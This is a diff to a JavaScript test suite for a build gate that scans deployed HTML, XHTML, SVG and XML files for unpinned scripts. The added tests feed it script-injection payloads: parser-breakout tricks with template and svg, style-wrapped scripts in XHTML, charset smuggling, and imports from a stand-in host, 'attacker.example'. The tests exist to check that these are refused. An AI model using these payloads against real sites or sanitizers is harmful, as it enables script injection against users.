@@ -17,6 +17,7 @@ import {
   buildGraph,
   checkDocuments,
   classifyModule,
+  decodeDocument,
   decodeEntities,
   evaluateGraph,
   gitTracked,
@@ -132,7 +133,8 @@ test("an allowlisted package in any chunk is a violation; unknown ownership and 
   throwsGate(() => graph([["a.js", APP]], ["assets/module.wasm"]), /no recognised inert type/);
   throwsGate(() => graph([["a.js", [`${ROOT}/node_modules/react/index.js`]]]), /no first-party module/);
   throwsGate(() => graph([["a.js", [`${ROOT}/src/main.tsx`]]]), /no npm package/);
-  assert.deepEqual(["x.html", "x.xhtml", "x.svg", "sitemap.xml", "x.css", "x.png", "x.wasm", "x"].map(inertKind), ["html", "html", "xml", "xml", "text", "binary", null, null]);
+  // XHTML is an XML document to a browser (application/xhtml+xml), not an HTML one.
+  assert.deepEqual(["x.html", "x.xhtml", "x.svg", "sitemap.xml", "x.css", "x.png", "x.wasm", "x"].map(inertKind), ["html", "xml", "xml", "xml", "text", "binary", null, null]);
 });
 
 test("the bundle-trust section is validated strictly and filtered by project", () => {
@@ -237,6 +239,22 @@ test("documents are tokenised conservatively: comments, declarations, contexts, 
   // An SVG script element has no `language` attribute: it is marked foreign and judged on `type` alone.
   assert.deepEqual(scan('<svg><script language="vbscript">x</script></svg>').scripts.map((s) => s.foreign), [true]);
   assert.deepEqual(scan('<script language="vbscript">x</script>').scripts.map((s) => s.foreign), [false]);
+  // Parsing contexts a browser enters that this scanner refuses rather than models: <template> insertion
+  // modes, and the start/end tags that make a browser leave foreign content while <svg> is open.
+  throwsGate(() => scan('<template><col><style></template><script src="https://attacker.example/matcher.js"></script></style>'), /<template> is refused/);
+  throwsGate(() => scan('<svg><p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
+  throwsGate(() => scan('<svg></p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
+  throwsGate(() => scan("<svg><font color=red><script/>x</script></svg>"), /foreign-content breakout/);
+  throwsGate(() => scan("<svg><g><div>x</div></g></svg>"), /foreign-content breakout/);
+  assert.equal(scan("<svg><g><rect/></g></svg><p>fine</p><div>ok</div><br>").scripts.length, 0); // the same tags outside <svg> are fine
+  throwsGate(() => scan("<svg / ><style><script>globalThis.pwned=1</script></style></svg>"), /cannot parse attributes/);
+  // Encodings: the bytes are read as UTF-8, so a document may declare nothing else.
+  throwsGate(() => scan("<meta charset=iso-2022-jp><style></style>"), /declares the charset "iso-2022-jp"/);
+  throwsGate(() => scan('<meta http-equiv="content-type" content="text/html; charset=windows-1252">'), /declares the charset "windows-1252"/);
+  throwsGate(() => scan('<meta http-equiv="Content-Type" content="text/html; charset=&#x69;so-2022-jp">'), /declares the charset "iso-2022-jp"/);
+  assert.equal(scan('<meta charset="UTF-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name=viewport content=x>').scripts.length, 0);
+  throwsGate(() => scan('<?xml version="1.0" encoding="ISO-2022-JP"?><svg/>', { xml: true }), /XML declaration encoding "ISO-2022-JP"/);
+  assert.equal(scan('<?xml version="1.0" encoding="UTF-8"?><svg/>', { xml: true }).scripts.length, 0);
   throwsGate(() => scan('<!-- <script src="/a.js"> --><script src="https://cdn.example.invalid/x.js"></script>'), /comment contains markup/);
   throwsGate(() => scan("<!-- a > b -->"), /comment contains markup/);
   throwsGate(() => scan("<!-- never closed"), /unterminated comment/);
@@ -271,6 +289,11 @@ test("documents are tokenised conservatively: comments, declarations, contexts, 
   assert.equal(scan('<img src="data:image/svg+xml,%3Csvg%3E"><link rel="icon" href="data:image/png;base64,AAAA">').scripts.length, 0);
   throwsGate(() => scan('<meta http-equiv="refresh" content="0">'), /without a url/);
   throwsGate(() => scan("<svg><foreignObject><div>x</div></foreignObject></svg>", { xml: true }), /foreignObject/);
+  // decodeDocument: valid UTF-8 only, no C0 control other than tab/LF/FF/CR (ESC drives ISO-2022-JP; FF FE is a UTF-16 BOM).
+  assert.equal(decodeDocument(Buffer.from([0xef, 0xbb, 0xbf, 0x3c, 0x70, 0x3e, 0x09, 0x0a]), "t"), "<p>\t\n");
+  throwsGate(() => decodeDocument(Buffer.from("<p>\x1b$B</p>"), "t"), /control character U\+001B/);
+  throwsGate(() => decodeDocument(Buffer.from([0xff, 0xfe, 0x3c, 0x00]), "t"), /not valid UTF-8/);
+  throwsGate(() => decodeDocument(Buffer.from([0x3c, 0xc3, 0x28]), "t"), /not valid UTF-8/);
   assert.equal(decodeEntities("&#106;ava&#x53;cript&colon;&amp;&lt;&quot;&unknown;"), 'javaScript:&<"&unknown;');
 });
 
@@ -330,6 +353,8 @@ test("HTML documents: known sources, pinned inline scripts, inert data blocks, b
     throwsGate(() => judge("<script language>import('https://attacker.example/matcher.js')</script>"), /inline script 1 is not pinned/);
     assert.equal(judge('<script language="vbscript">x</script>').data, 1);
     throwsGate(() => judge('<svg><script language="vbscript">x</script></svg>'), /inline script 1 is not pinned/); // SVG scripts ignore `language`
+    assert.equal(judge('<svg><script type="text/plain">x</script></svg>').data, 1); // an explicit inert type stays inert
+    throwsGate(() => judge('<svg><script type="module">x</script></svg>'), /inline script 1 is not pinned/);
     assert.equal(judge('<script type="text/template">{"dep":"react"}</script>').data, 1);
     // Tokenizer states and SVG sources.
     throwsGate(() => judge('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
@@ -410,7 +435,21 @@ test("every output file is a hash-checked chunk, a pinned tracked public script,
     throwsGate(() => check(), /unsupported declaration/);
     put("feed.xml", '<?xml version="1.0"?><?xml-stylesheet href="x.xsl" type="text/xsl"?><feed/>');
     throwsGate(() => check(), /processing instructions/);
+    put("feed.xml", '<?xml version="1.0" encoding="ISO-2022-JP"?><feed/>');
+    throwsGate(() => check(), /XML declaration encoding/);
     rmSync(join(outDir, "feed.xml"));
+    // XHTML is XML: an XML parser does not hide child markup inside <style>, so the script would run.
+    put("payload.xhtml", '<html xmlns="http://www.w3.org/1999/xhtml"><body><style><script src="https://attacker.example/matcher.js"></script></style></body></html>');
+    throwsGate(() => check(), /payload\.xhtml is an XML document carrying a <script>/);
+    rmSync(join(outDir, "payload.xhtml"));
+    // Documents are read as UTF-8 and may declare nothing else; ESC bytes (ISO-2022-JP shifts) and UTF-16 fail.
+    put("jp.html", "<!doctype html><meta charset=iso-2022-jp><style></style>");
+    throwsGate(() => check(), /declares the charset "iso-2022-jp"/);
+    put("jp.html", Buffer.from("<!doctype html><p>\x1b$B</p>"));
+    throwsGate(() => check(), /control character U\+001B/);
+    put("jp.html", Buffer.from([0xff, 0xfe, 0x3c, 0x00, 0x70, 0x00, 0x3e, 0x00]));
+    throwsGate(() => check(), /not valid UTF-8/);
+    rmSync(join(outDir, "jp.html"));
     rmSync(join(outDir, "sitemap.xml"));
     put("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="x()"></svg>');
     throwsGate(() => check(), /inline event handler/);
@@ -648,7 +687,7 @@ test("the deployment build's output must equal this build's chunks and pins (--v
       writeFileSync(join(dist, chunk), originalChunk);
       writeFileSync(join(dist, "index.html"), html);
       writeFileSync(join(dist, "embed.js"), EMBED);
-      for (const extra of ["extra.js", "matcher.txt", "payload", "module.wasm", "evil.svg", "feed.xml"]) rmSync(join(dist, extra), { force: true });
+      for (const extra of ["extra.js", "matcher.txt", "payload", "module.wasm", "evil.svg", "feed.xml", "payload.xhtml"]) rmSync(join(dist, extra), { force: true });
     };
     const inHtml = (snippet) => () => writeFileSync(join(dist, "index.html"), html.replace("</body>", `${snippet}</body>`));
     await refused(() => writeFileSync(join(dist, chunk), Buffer.concat([originalChunk, Buffer.from("\n/* appended */\n")])), /rewritten after the build/);
@@ -666,6 +705,16 @@ test("the deployment build's output must equal this build's chunks and pins (--v
     await refused(inHtml("<script><!--<script>a</script>globalThis.pwned=1--></script>"), /script data escape sequence/);
     await refused(inHtml("<svg a=b/><style><script>globalThis.pwned=1</script></style></svg>"), /inline script 2 is not pinned/);
     await refused(inHtml('<svg><script language="vbscript">globalThis.pwned=1</script></svg>'), /inline script 2 is not pinned/);
+    await refused(inHtml('<template><col><style></template><script src="https://attacker.example/matcher.js"></script></style>'), /<template> is refused/);
+    await refused(inHtml('<svg><p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
+    await refused(inHtml('<svg></p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
+    await refused(inHtml("<svg / ><style><script>globalThis.pwned=1</script></style></svg>"), /cannot parse attributes/);
+    await refused(() => writeFileSync(join(dist, "payload.xhtml"), '<html xmlns="http://www.w3.org/1999/xhtml"><body><style><script src="https://attacker.example/matcher.js"></script></style></body></html>'), /payload\.xhtml is an XML document carrying a <script>/);
+    await refused(inHtml("<meta charset=iso-2022-jp>"), /declares the charset "iso-2022-jp"/);
+    await refused(() => writeFileSync(join(dist, "index.html"), Buffer.concat([Buffer.from(html.replace("</body>", "<p>")), Buffer.from([0x1b]), Buffer.from("$B</p></body>")])), /control character U\+001B/);
+    await refused(() => writeFileSync(join(dist, "evil.svg"), '<?xml version="1.0" encoding="ISO-2022-JP"?><svg xmlns="http://www.w3.org/2000/svg"/>'), /XML declaration encoding/);
+    // A refresh to an XML target is judged through the target itself, which may carry no script.
+    await refused(() => { writeFileSync(join(dist, "evil.svg"), "<svg xmlns='http://www.w3.org/2000/svg'><script>x()</script></svg>"); inHtml('<meta http-equiv="refresh" content="0; url=evil.svg">')(); }, /evil\.svg is an XML document carrying a <script>/);
     await refused(inHtml('<script language="">import("https://attacker.example/matcher.js")</script>'), /inline script 2 is not pinned/);
     await refused(() => writeFileSync(join(dist, "embed.js"), "/* replaced after the build */\n"), /embed\.js does not match its pin/);
     await refused(inHtml("<script>window.__late = 1</script>"), /inline script 2 is not pinned/);
